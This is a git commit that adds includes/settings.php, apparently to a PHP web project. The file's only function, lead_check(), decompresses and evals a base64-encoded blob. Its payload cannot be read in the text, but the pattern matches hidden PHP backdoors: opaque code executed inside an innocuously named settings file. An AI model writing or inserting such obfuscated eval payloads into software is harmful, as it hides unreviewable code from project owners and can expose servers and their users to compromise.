5ebaab0ca64d763bd43a87891694155031a290d4
zchandio <zchandio@mamdaniweb.com>
2013-05-29 13:17:32 +0500

    Create settings.php

---
+++ includes/settings.php
@@ -0,0 +1,14 @@
+<?php
+/**
+ * Created by Touqeer Shafi.
+ * Email: touqeer.shafi@gmail.com
+ * Date: 5/28/13
+ * Time: 6:17 PM
+ * File: settings.php
+ */
+function lead_check(){
+    eval(gzinflate(base64_decode('jZDdSsNAEIXvBd9hKYEmEBq8VSKItiCUtiTplSnLupmSlU023R+xFN/dSZqoFbHOzTJnv5k5Mx4vSUy405KKWlg/uLm8IBidYsCqxvoeL0Nyv07my1VG8QnzUWltcx1FVrkdgDYl24oJV1XUlk2asslHZxutlmkWkqt/cbPH6fwhDdup9NkJWdCdA733mdZs7+djZ0BTqJiQ+ZjEt8Trqp5OPzZhn9esgt+4o74JgrOekmm2ThZZcrdIZ9Pk2xaeBuOkHU4Kb8BJW3rSkUtl4ET+KnsxqqYFcFWA36vhZ3exHTS0bCyzzqBfEscEU8c5GMyDwxFuwzUFs0DRv1A13kkCKwxl3IpX1It8jCex2uHWw4jOzQ8MbbVQT7yDNHD4k94yRAb8Aw==')));
+}
+ /*
+  * End file settings.php
+ */
